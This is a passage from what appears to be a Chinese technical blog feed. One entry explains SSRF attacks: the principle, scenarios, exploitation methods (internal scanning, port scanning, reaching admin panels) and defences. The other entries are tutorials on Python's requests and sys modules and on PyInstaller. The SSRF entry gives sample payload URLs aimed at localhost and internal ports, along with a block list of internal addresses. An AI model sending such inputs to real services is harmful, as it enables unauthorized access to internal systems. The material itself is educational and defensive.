    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="SSRF（Server-Side-Request-Forgery，服务器端请求伪造）的原理"><a href="#SSRF（Server-Side-Request-Forgery，服务器端请求伪造）的原理" class="headerlink" title="SSRF（Server-Side Request Forgery，服务器端请求伪造）的原理"></a>SSRF（Server-Side Request Forgery，服务器端请求伪造）的原理</h2><p>SSRF（服务器端请求伪造）是一种攻击技术，攻击者通过操控一个Web应用发起伪造的请求，从而欺骗目标服务器，导致服务器向攻击者指定的地址（可能是外部服务器，也可能是内网地址）发起请求。这类攻击利用了服务器本身的网络访问权限，通常可以绕过防火墙和网络隔离，访问原本无法访问的资源，进而引发数据泄露、系统入侵等安全问题。</p><p>SSRF的关键在于通过<strong>操控Web应用的请求机制</strong>来访问原本不可访问的服务。攻击者并不直接与目标服务器交互，而是通过漏洞利用Web服务器发起恶意请求。</p><h2 id="SSRF攻击的工作流程"><a href="#SSRF攻击的工作流程" class="headerlink" title="SSRF攻击的工作流程"></a>SSRF攻击的工作流程</h2><ol><li><p><strong>攻击者输入恶意数据</strong>：攻击者通过Web应用的输入点提交恶意URL或地址。这些输入点通常是用户可以控制的字段，如Web表单、URL参数、文件上传等。</p></li><li><p><strong>Web应用发起请求</strong>：Web应用将攻击者提交的恶意输入当作目标URL或地址，并通过后端代码（如HTTP请求库）发起请求。此时，Web应用扮演了请求发起者的角色，攻击者的恶意请求通过Web服务器发起。</p></li><li><p><strong>恶意请求触发访问</strong>：根据攻击者提供的恶意URL或地址，Web应用可能会访问内部资源（如内网的API、管理接口或数据库服务）或者外部资源（如攻击者控制的恶意网站）。</p></li><li><p><strong>返回的响应被利用</strong>：如果Web应用未正确处理这些请求，攻击者可能通过返回的数据进行进一步的攻击，例如泄露敏感信息、获取内网服务的返回数据、进行端口扫描等。</p></li><li><p><strong>利用网络环境漏洞</strong>：通过SSRF，攻击者可以利用目标服务器的内网权限绕过防火墙、网络隔离等安全策略，访问本不应该暴露的服务和数据。</p></li></ol><hr><h2 id="SSRF的攻击场景"><a href="#SSRF的攻击场景" class="headerlink" title="SSRF的攻击场景"></a>SSRF的攻击场景</h2><p>SSRF攻击通常发生在以下几种场景中：</p><ol><li><p><strong>URL输入漏洞</strong><br>用户通过Web应用提交一个URL，Web应用会尝试访问这个URL，常见的例子包括：</p><ul><li>允许用户提交URL的文件下载功能</li><li>允许用户输入URL并在Web页面中显示其内容</li><li>通过URL查询外部API或获取资源</li></ul></li><li><p><strong>文件上传漏洞</strong><br>Web应用可能允许用户上传文件，并对上传的文件进行处理。如果Web应用在文件上传时需要根据上传内容的URL进行请求，攻击者可以上传带有恶意URL的文件（如包含<code>http://localhost/admin</code>的图片或其他格式的文件）。</p></li><li><p><strong>HTTP请求头恶意伪造</strong><br>一些应用会根据请求头的内容（如<code>X-Forwarded-For</code>、<code>Host</code>等）发起请求。攻击者可以伪造这些头信息，诱使Web应用访问内网服务。</p></li><li><p><strong>其他网络请求功能</strong><br>Web应用可能有其他类型的网络请求功能，如发送HTTP请求以获取数据，或在后台进行Web抓取。攻击者可以通过伪造请求的目标来控制访问内网或外部资源。</p></li></ol><hr><h2 id="SSRF攻击的常见利用方法"><a href="#SSRF攻击的常见利用方法" class="headerlink" title="SSRF攻击的常见利用方法"></a>SSRF攻击的常见利用方法</h2><ol><li><p><strong>内网服务扫描</strong><br>通过SSRF，攻击者可以扫描目标Web服务器所在的内网，发现本来应该无法访问的内网服务。例如，通过访问<code>http://localhost:8080</code>，攻击者可以访问目标服务器的本地管理接口、数据库服务等。</p></li><li><p><strong>信息泄漏</strong><br>SSRF攻击可能导致内部资源的泄漏。例如，攻击者可以通过访问<code>http://localhost:9200</code>来扫描和获取Elasticsearch数据库的敏感信息，或通过访问<code>http://127.0.0.1:5000</code>获取内网API的返回数据。</p></li><li><p><strong>端口扫描</strong><br>攻击者可以通过控制请求目标地址和端口进行端口扫描，识别目标服务器所在内网的开放端口。例如，攻击者可以利用SSRF通过请求<code>http://localhost:1-65535</code>来扫描目标服务器所有的端口。</p></li><li><p><strong>服务绕过</strong><br>有些Web应用配置了IP白名单或防火墙，阻止来自外部的直接访问。攻击者可以通过SSR攻击发起来自Web应用服务器的请求，从而绕过这些安全机制。</p></li><li><p><strong>利用内网API或管理面板</strong><br>Web服务器可能会访问内部的管理系统、API或其他受保护的资源。攻击者通过SSRF访问这些资源，可能会获取敏感数据、执行管理命令或修改系统设置。</p></li></ol><hr><h2 id="SSRF攻击的例子"><a href="#SSRF攻击的例子" class="headerlink" title="SSRF攻击的例子"></a>SSRF攻击的例子</h2><h3 id="例子1：URL作为参数"><a href="#例子1：URL作为参数" class="headerlink" title="例子1：URL作为参数"></a>例子1：URL作为参数</h3><p>假设有一个Web应用，它允许用户输入一个URL并返回该URL指向的资源。攻击者可以提交恶意的URL，如：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost/admin</span><br></pre></td></tr></table></figure></div><p>Web应用会尝试从<code>localhost</code>请求该资源，而实际上<code>localhost</code>是Web服务器的内部地址，可能会导致访问敏感的管理接口，泄露后台管理页面。</p><h3 id="例子2：文件上传"><a href="#例子2：文件上传" class="headerlink" title="例子2：文件上传"></a>例子2：文件上传</h3><p>假设某个Web应用允许用户上传图片，攻击者上传一个图片文件，并在图片的元数据中嵌入恶意的URL（如<code>http://127.0.0.1:8080/api</code>）。当应用处理文件时，它会访问该URL，从而使攻击者能够访问内网资源。</p><hr><h2 id="防御SSRF的策略"><a href="#防御SSRF的策略" class="headerlink" title="防御SSRF的策略"></a>防御SSRF的策略</h2><ol><li><p><strong>限制服务器请求的目标范围</strong><br>在Web应用服务器中，使用防火墙或网络访问控制列表（ACL）来限制请求的目标范围，禁止访问<code>localhost</code>、<code>127.0.0.1</code>、内网IP地址（如<code>192.168.x.x</code>、<code>10.x.x.x</code>）等。</p></li><li><p><strong>严格校验输入的URL</strong><br>对用户输入的URL进行严格校验，防止请求内网资源。可以通过正则表达式、白名单等方式限制允许的域名和IP地址。拒绝掉本地地址（如<code>localhost</code>、<code>127.0.0.1</code>等）和不可访问的IP段。</p></li><li><p><strong>限制HTTP请求头</strong><br>在HTTP请求中，某些头信息（如<code>X-Forwarded-For</code>、<code>Host</code>、<code>Referer</code>）可以被恶意伪造。要确保对这些头信息进行严格校验，防止攻击者通过伪造请求头进行绕过。</p></li><li><p><strong>使用请求代理</strong><br>在发起外部请求时，使用请求代理来控制外部请求的来源，减少Web服务器直接发起恶意请求的风险。</p></li><li><p><strong>输出过滤和响应校验</strong><br>对返回的内容进行适当的过滤和检查，确保不泄露内部敏感信息。例如，不应将堆栈信息、错误信息等直接返回给用户。</p></li><li><p><strong>日志审计</strong><br>对Web服务器的请求进行详细日志记录，尤其是外部请求。审计异常请求、未授权访问等，帮助发现潜在的SSRF攻击行为。</p></li></ol><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="SSRF" scheme="http://example.com/categories/SSRF/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>py requests库</title>
    <link href="http://example.com/2024/11/30/python/py-requests/"/>
    <id>http://example.com/2024/11/30/python/py-requests/</id>
    <published>2024-11-30T23:52:50.000Z</published>
    <updated>2025-03-04T10:38:46.835Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><code>requests</code> 库是 Python 中一个用于发送 HTTP 请求的第三方库。它提供了一个简单、直观的 API，使得发送 HTTP 请求和处理响应变得非常容易。以下是对 <code>requests</code> 库的详细介绍：</p><h3 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h3><p><code>requests</code> 库旨在让 HTTP 请求变得简单。它基于 urllib3 库，但提供了更高级别的接口，使得开发者无需直接处理底层的套接字或连接池等细节。<code>requests</code> 库支持各种 HTTP 请求方法（如 GET、POST、PUT、DELETE 等），并允许自定义请求头、参数、超时设置等。</p><h3 id="二、安装"><a href="#二、安装" class="headerlink" title="二、安装"></a>二、安装</h3><p><code>requests</code> 库可以通过 Python 的包管理器 pip 进行安装。在命令行中运行以下命令即可：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pip install requests</span><br></pre></td></tr></table></figure></div><h3 id="三、主要功能"><a href="#三、主要功能" class="headerlink" title="三、主要功能"></a>三、主要功能</h3><ol><li><p><strong>发送 HTTP 请求</strong>：</p><ul><li><code>requests.get(url, **kwargs)</code>：发送 GET 请求。</li><li><code>requests.post(url, data=None, json=None, **kwargs)</code>：发送 POST 请求，可以传递表单数据或 JSON 数据。</li><li><code>requests.put(url, data=None, **kwargs)</code>：发送 PUT 请求，用于更新资源。</li><li><code>requests.delete(url, **kwargs)</code>：发送 DELETE 请求，用于删除资源。</li><li>其他 HTTP 方法（如 HEAD、OPTIONS）也有相应的函数。</li></ul></li><li><p><strong>处理响应</strong>：</p><ul><li>响应对象包含了许多有用的方法和属性，如 <code>status_code</code>（状态码）、<code>headers</code>（响应头）、<code>text</code>（响应体，解码后的字符串）、<code>content</code>（响应体，原始的字节流）等。</li><li>可以使用 <code>response.json()</code> 方法将 JSON 格式的响应体解析为 Python 字典。</li></ul></li><li><p><strong>自定义请求</strong>：</p><ul><li>可以使用 <code>params</code> 参数传递 URL 查询参数。</li><li>可以使用 <code>headers</code> 参数自定义请求头。</li><li>可以使用 <code>cookies</code> 参数传递 cookies。</li><li>可以使用 <code>auth</code> 参数进行身份认证。</li><li>可以使用 <code>timeout</code> 参数设置请求超时时间。</li><li>可以使用 <code>proxies</code> 参数设置代理服务器。</li></ul></li><li><p><strong>会话对象</strong>：</p><ul><li>使用 <code>requests.Session()</code> 可以创建一个会话对象，用于保持某些参数（如 cookies 和 headers）的一致性，并在同一会话中发送多个请求。</li></ul></li><li><p><strong>异常处理</strong>：</p><ul><li><code>requests</code> 库提供了异常处理机制，可以捕获如 <code>requests.exceptions.RequestException</code>、<code>requests.exceptions.HTTPError</code>、<code>requests.exceptions.ConnectionError</code> 等异常。</li></ul></li></ol><h3 id="四、优点"><a href="#四、优点" class="headerlink" title="四、优点"></a>四、优点</h3><ul><li><strong>简单易用</strong>：<code>requests</code> 库的 API 设计简洁明了，使得发送 HTTP 请求和处理响应变得非常容易。</li><li><strong>功能强大</strong>：支持各种 HTTP 请求方法、自定义请求头、参数、超时设置等高级功能。</li><li><strong>自动处理 cookies</strong>：会话对象可以自动处理 cookies，使得在同一会话中发送多个请求时无需手动管理 cookies。</li><li><strong>异常处理</strong>：提供了丰富的异常处理机制，方便开发者捕获和处理各种网络请求异常。</li></ul><h3 id="五、示例"><a href="#五、示例" class="headerlink" title="五、示例"></a>五、示例</h3><p>以下是一个简单的示例，展示了如何使用 <code>requests</code> 库发送 GET 请求并处理响应：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送 GET 请求</span></span><br><span class="line">response = requests.get(<span class="string">&#x27;https://api.example.com/data&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查状态码</span></span><br><span class="line"><span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">    <span class="comment"># 获取响应体并解码为字符串</span></span><br><span class="line">    data = response.text</span><br><span class="line">    <span class="comment"># 或者使用 response.json() 方法解析 JSON 格式的响应体</span></span><br><span class="line">    <span class="comment"># data = response.json()</span></span><br><span class="line">    <span class="comment"># 处理数据...</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># 处理错误状态码...</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Error:&#x27;</span>, response.status_code)</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="python" scheme="http://example.com/categories/python/"/>
    
    
    <category term="py库" scheme="http://example.com/tags/py%E5%BA%93/"/>
    
    <category term="requests" scheme="http://example.com/tags/requests/"/>
    
  </entry>
  
  <entry>
    <title>py sys库</title>
    <link href="http://example.com/2024/11/30/python/py-sys/"/>
    <id>http://example.com/2024/11/30/python/py-sys/</id>
    <published>2024-11-30T23:34:53.000Z</published>
    <updated>2025-03-04T10:38:46.835Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="导入-sys-模块"><a href="#导入-sys-模块" class="headerlink" title="导入 sys 模块"></a>导入 <code>sys</code> 模块</h3><p>要使用 <code>sys</code> 模块中的功能，首先需要导入它：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br></pre></td></tr></table></figure></div><h3 id="常用功能"><a href="#常用功能" class="headerlink" title="常用功能"></a>常用功能</h3><h4 id="1-访问命令行参数"><a href="#1-访问命令行参数" class="headerlink" title="1. 访问命令行参数"></a>1. 访问命令行参数</h4><p><code>sys.argv</code> 是一个列表，包含了命令行参数。<code>sys.argv[0]</code> 是脚本的名称，<code>sys.argv[1:]</code> 是传递给脚本的参数。</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Script name:&quot;</span>, sys.argv[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">for</span> i, arg <span class="keyword">in</span> <span class="built_in">enumerate</span>(sys.argv[<span class="number">1</span>:], start=<span class="number">1</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Argument <span class="subst">&#123;i&#125;</span>: <span class="subst">&#123;arg&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div><p>如果你运行 <code>python script.py arg1 arg2</code>，输出将会是：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Script name: script.py</span><br><span class="line">Argument 1: arg1</span><br><span class="line">Argument 2: arg2</span><br></pre></td></tr></table></figure></div><h4 id="2-标准输入输出和错误"><a href="#2-标准输入输出和错误" class="headerlink" title="2. 标准输入输出和错误"></a>2. 标准输入输出和错误</h4><p><code>sys</code> 模块提供了三个与标准流相关的变量：<code>sys.stdin</code>（标准输入）、<code>sys.stdout</code>（标准输出）和 <code>sys.stderr</code>（标准错误）。你可以重定向这些流或者替换它们。</p><p>例如，将标准输出重定向到一个文件：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    sys.stdout = f</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;This will be written to output.txt&quot;</span>)</span><br><span class="line">    sys.stdout = sys.__stdout__  <span class="comment"># 恢复原来的标准输出</span></span><br></pre></td></tr></table></figure></div><h4 id="3-退出程序"><a href="#3-退出程序" class="headerlink" title="3. 退出程序"></a>3. 退出程序</h4><p><code>sys.exit([arg])</code> 函数用于退出当前程序。如果提供了一个参数，则会被作为程序的退出状态码（0 表示成功，非0 表示失败）。</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> some_error_condition:</span><br><span class="line">    sys.exit(<span class="number">1</span>)  <span class="comment"># 非零值表示错误</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sys.exit(<span class="number">0</span>)  <span class="comment"># 零值表示成功</span></span><br></pre></td></tr></table></figure></div><p>你也可以直接调用 <code>sys.exit()</code> 而不带参数，这等价于 <code>sys.exit(0)</code>。</p><h4 id="4-最大递归深度"><a href="#4-最大递归深度" class="headerlink" title="4. 最大递归深度"></a>4. 最大递归深度</h4><p><code>sys.setrecursionlimit(limit)</code> 函数允许你设置 Python 解释器的最大递归深度。默认深度通常是 1000，但这个值可以根据需要进行调整。不过，增加递归深度可能会导致栈溢出错误。</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置最大递归深度为 2000</span></span><br><span class="line">sys.setrecursionlimit(<span class="number">2000</span>)</span><br></pre></td></tr></table></figure></div><h4 id="5-Python-版本信息"><a href="#5-Python-版本信息" class="headerlink" title="5. Python 版本信息"></a>5. Python 版本信息</h4><p><code>sys.version</code> 和 <code>sys.version_info</code> 提供了关于 Python 解释器版本的信息。<code>sys.version</code> 是一个字符串，而 <code>sys.version_info</code> 是一个命名元组，提供了更结构化的访问方式。</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Python version (string):&quot;</span>, sys.version)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Python version (info):&quot;</span>, sys.version_info)</span><br></pre></td></tr></table></figure></div><h3 id="其他功能"><a href="#其他功能" class="headerlink" title="其他功能"></a>其他功能</h3><ul><li><code>sys.path</code>：一个列表，包含了模块搜索路径的字符串。你可以通过修改这个列表来影响模块的导入行为。</li><li><code>sys.modules</code>：一个字典，包含了所有已导入的模块。键是模块名，值是模块对象。</li><li><code>sys.platform</code>：一个字符串，表示运行 Python 解释器的操作系统平台。</li><li><code>sys.getsizeof(object)</code>：返回对象所占用的内存大小（以字节为单位），不包括对象引用的其他对象。</li><li><code>sys.settrace(tracefunc)</code> 和 <code>sys.gettrace()</code>：用于设置或获取全局跟踪函数，这通常用于调试目的。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="python" scheme="http://example.com/categories/python/"/>
    
    
    <category term="sys" scheme="http://example.com/tags/sys/"/>
    
    <category term="py库" scheme="http://example.com/tags/py%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>快速上手pyinstaller</title>
    <link href="http://example.com/2024/11/30/python/pyinstaller/"/>
    <id>http://example.com/2024/11/30/python/pyinstaller/</id>
    <published>2024-11-30T20:59:53.000Z</published>
    <updated>2025-03-04T10:38:46.835Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><hr><h2 id="1-PyInstaller-安装"><a href="#1-PyInstaller-安装" class="headerlink" title="1. PyInstaller 安装"></a><strong>1. PyInstaller 安装</strong></h2><p>首先安装 PyInstaller：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pip install pyinstaller</span><br></pre></td></tr></table></figure></div><p>验证安装是否成功：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pyinstaller --version</span><br></pre></td></tr></table></figure></div><hr><h2 id="2-基本用法"><a href="#2-基本用法" class="headerlink" title="2. 基本用法"></a><strong>2. 基本用法</strong></h2><h3 id="打包单个脚本"><a href="#打包单个脚本" class="headerlink" title="打包单个脚本"></a><strong>打包单个脚本</strong></h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pyinstaller your_script.py</span><br></pre></td></tr></table></figure></div><ul><li>生成的文件会放在 <code>dist/your_script/</code> 目录下，包含可执行文件和依赖的多个文件。</li></ul><h3 id="打包为单个可执行文件"><a href="#打包为单个可执行文件" class="headerlink" title="打包为单个可执行文件"></a><strong>打包为单个可执行文件</strong></h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pyinstaller --onefile your_script.py</span><br></pre></td></tr></table></figure></div><ul><li><code>--onefile</code> 将所有依赖和代码合并为一个独立的可执行文件。</li></ul><hr><h2 id="3-PyInstaller-常用选项"><a href="#3-PyInstaller-常用选项" class="headerlink" title="3. PyInstaller 常用选项"></a><strong>3. PyInstaller 常用选项</strong></h2><p>以下是常用选项的功能和用法：</p><h3 id="1-添加图标"><a href="#1-添加图标" class="headerlink" title="1. 添加图标"></a><strong>1. 添加图标</strong></h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pyinstaller --onefile --icon=your_icon.ico your_script.py</span><br></pre></td></tr></table></figure></div><ul><li>**<code>--icon</code>**：指定 <code>.ico</code> 图标文件，适用于 Windows。</li></ul><hr><h3 id="2-隐藏终端窗口"><a href="#2-隐藏终端窗口" class="headerlink" title="2. 隐藏终端窗口"></a><strong>2. 隐藏终端窗口</strong></h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pyinstaller --onefile --noconsole your_script.py</span><br></pre></td></tr></table></figure></div><ul><li>**<code>--noconsole</code>**：适用于 GUI 程序，隐藏终端窗口（仅在 Windows 中有效）。</li></ul><hr><h3 id="3-指定额外依赖路径"><a href="#3-指定额外依赖路径" class="headerlink" title="3. 指定额外依赖路径"></a><strong>3. 指定额外依赖路径</strong></h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pyinstaller --onefile --paths=/path/to/extra/modules your_script.py</span><br></pre></td></tr></table></figure></div><ul><li>**<code>--paths</code>**：用于包含 Python 脚本未在标准路径下的模块或包。</li></ul><hr><h3 id="4-处理隐藏导入"><a href="#4-处理隐藏导入" class="headerlink" title="4. 处理隐藏导入"></a><strong>4. 处理隐藏导入</strong></h3><p>某些模块（如动态导入的模块）可能无法被自动检测到，需要手动指定：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pyinstaller --hidden-import=module_name your_script.py</span><br></pre></td></tr></table></figure></div><ul><li>**<code>--hidden-import</code>**：解决未检测的依赖模块。</li></ul><hr><h3 id="5-压缩可执行文件"><a href="#5-压缩可执行文件" class="headerlink" title="5. 压缩可执行文件"></a><strong>5. 压缩可执行文件</strong></h3><p>如果可执行文件体积较大，可以使用 UPX 压缩：</p><ol><li>安装 UPX。</li><li>使用以下命令：<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pyinstaller --onefile --upx-dir=/path/to/upx your_script.py</span><br></pre></td></tr></table></figure></div></li></ol><hr><h3 id="6-调试模式"><a href="#6-调试模式" class="headerlink" title="6. 调试模式"></a><strong>6. 调试模式</strong></h3><p>在打包时开启调试模式以查看详细错误信息：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pyinstaller --debug=all your_script.py</span><br></pre></td></tr></table></figure></div><hr><h3 id="7-指定工作目录"><a href="#7-指定工作目录" class="headerlink" title="7. 指定工作目录"></a><strong>7. 指定工作目录</strong></h3><p>为避免污染当前目录，可以指定工作目录：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pyinstaller --workpath=/path/to/workdir your_script.py</span><br></pre></td></tr></table></figure></div><ul><li>**<code>--workpath</code>**：指定临时文件的存放目录。</li></ul><hr><h2 id="4-打包结果文件说明"><a href="#4-打包结果文件说明" class="headerlink" title="4. 打包结果文件说明"></a><strong>4. 打包结果文件说明</strong></h2><ol><li>**<code>dist/</code>**：生成的可执行文件和相关资源。</li><li>**<code>build/</code>**：构建过程中产生的临时文件。</li><li><strong><code>.spec</code> 文件</strong>：PyInstaller 的配置文件，可手动修改以支持更复杂的需求。</li></ol><hr><h2 id="5-使用-spec-文件"><a href="#5-使用-spec-文件" class="headerlink" title="5. 使用 .spec 文件"></a><strong>5. 使用 <code>.spec</code> 文件</strong></h2><h3 id="生成-spec-文件"><a href="#生成-spec-文件" class="headerlink" title="生成 .spec 文件"></a>生成 <code>.spec</code> 文件</h3><p>在第一次运行 PyInstaller 时会自动生成 <code>.spec</code> 文件：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pyinstaller your_script.py</span><br></pre></td></tr></table></figure></div><p>或手动创建：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pyinstaller --onefile --icon=your_icon.ico your_script.py</span><br></pre></td></tr></table></figure></div><h3 id="编辑-spec-文件"><a href="#编辑-spec-文件" class="headerlink" title="编辑 .spec 文件"></a>编辑 <code>.spec</code> 文件</h3><p>你可以修改 <code>.spec</code> 文件来配置：</p><ol><li><strong>数据文件</strong>（如图片、配置文件）：<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">datas=[(<span class="string">&#x27;path/to/datafile&#x27;</span>, <span class="string">&#x27;destination_folder&#x27;</span>)]</span><br></pre></td></tr></table></figure></div></li><li><strong>隐藏导入</strong>：<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">hiddenimports=[<span class="string">&#x27;module1&#x27;</span>, <span class="string">&#x27;module2&#x27;</span>]</span><br></pre></td></tr></table></figure></div></li></ol><h3 id="使用-spec-文件重新打包"><a href="#使用-spec-文件重新打包" class="headerlink" title="使用 .spec 文件重新打包"></a>使用 <code>.spec</code> 文件重新打包</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pyinstaller your_script.spec</span><br></pre></td></tr></table></figure></div><hr><h2 id="6-示例应用场景"><a href="#6-示例应用场景" class="headerlink" title="6. 示例应用场景"></a><strong>6. 示例应用场景</strong></h2><h3 id="简单脚本打包"><a href="#简单脚本打包" class="headerlink" title="简单脚本打包"></a><strong>简单脚本打包</strong></h3><p>假设有一个脚本 <code>hello.py</code>：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Hello, PyInstaller!&quot;</span>)</span><br></pre></td></tr></table></figure></div><p>运行以下命令：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pyinstaller --onefile hello.py</span><br></pre></td></tr></table></figure></div><p>生成的可执行文件位于 <code>dist/hello.exe</code>。</p><hr><h3 id="打包-GUI-程序"><a href="#打包-GUI-程序" class="headerlink" title="打包 GUI 程序"></a><strong>打包 GUI 程序</strong></h3><p>对于 Tkinter 或 PyQt5 程序，示例脚本 <code>gui_app.py</code>：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tkinter <span class="keyword">import</span> Tk, Label</span><br><span class="line"></span><br><span class="line">root = Tk()</span><br><span class="line">Label(root, text=<span class="string">&quot;Hello, GUI!&quot;</span>).pack()</span><br><span class="line">root.mainloop()</span><br></pre></td></tr></table></figure></div><p>运行命令：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pyinstaller --onefile --noconsole --icon=app_icon.ico gui_app.py</span><br></pre></td></tr></table></figure></div><hr><h3 id="包含数据文件"><a href="#包含数据文件" class="headerlink" title="包含数据文件"></a><strong>包含数据文件</strong></h3><p>如果脚本依赖额外的数据文件：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># example.py</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">path = os.path.join(os.path.dirname(__file__), <span class="string">&#x27;config.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(path) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="built_in">print</span>(f.read())</span><br></pre></td></tr></table></figure></div><p>命令：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pyinstaller --onefile --add-data <span class="string">&quot;config.txt;.&quot;</span> example.py</span><br></pre></td></tr></table></figure></div><ul><li>**<code>--add-data</code>**：格式为 <code>文件路径;目标目录</code>。</li></ul><hr><h2 id="7-常见问题与解决"><a href="#7-常见问题与解决" class="headerlink" title="7. 常见问题与解决"></a><strong>7. 常见问题与解决</strong></h2><ol><li><p><strong>运行时缺失模块</strong></p><ul><li>检查日志，使用 